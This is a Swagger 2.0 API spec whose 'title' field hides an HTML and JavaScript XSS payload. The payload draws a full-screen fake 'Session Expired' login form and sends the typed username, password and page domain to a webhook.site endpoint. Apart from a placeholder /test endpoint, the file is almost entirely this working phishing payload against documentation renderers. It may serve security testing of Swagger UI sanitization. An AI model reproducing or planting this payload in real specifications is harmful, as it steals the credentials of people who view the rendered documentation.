swagger: "2.0"
info:
  title: |
    <div id="fakeLogin" style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999">
      <h2>Session Expired - Please Re-login</h2>
      <form onsubmit="stealCredentials()">
        <input type="text" id="username" placeholder="Username">
        <input type="password" id="password" placeholder="Password">
        <button type="submit">Login</button>
      </form>
    </div>
    <script>
      function stealCredentials() {
        const user = document.getElementById('username').value;
        const pass = document.getElementById('password').value;
        fetch('https://webhook.site/YOUR_WEBHOOK_ID', {
          method: 'POST',
          body: JSON.stringify({username: user, password: pass, domain: document.domain})
        });
        return false;
      }
    </script>
  description: "API Documentation"
  version: "1.0"
paths:
  /test:
    get:
      summary: "Test endpoint"
      responses:
        '200':
          description: "Success"
